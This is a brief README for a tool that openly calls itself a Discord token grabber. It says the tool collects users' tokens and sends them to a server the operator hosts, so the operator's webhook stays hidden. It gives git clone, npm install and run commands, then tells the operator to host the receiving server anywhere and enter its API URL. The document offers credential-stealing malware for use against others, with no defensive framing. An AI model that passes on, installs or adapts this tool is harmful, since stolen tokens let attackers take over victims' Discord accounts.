> token grabber with very good capabilities obtains all the tokens and sends them to the server so your webhook is not exposed

### Install

`git clone https://github.com/k4itrun/DiscordTokenGrabber && cd DiscordTokenGrabber/client && npm i`

`node client/index`

**You host the server wherever you want and you only add the api url where the client asks you for it lmao**ðŸ‘¾
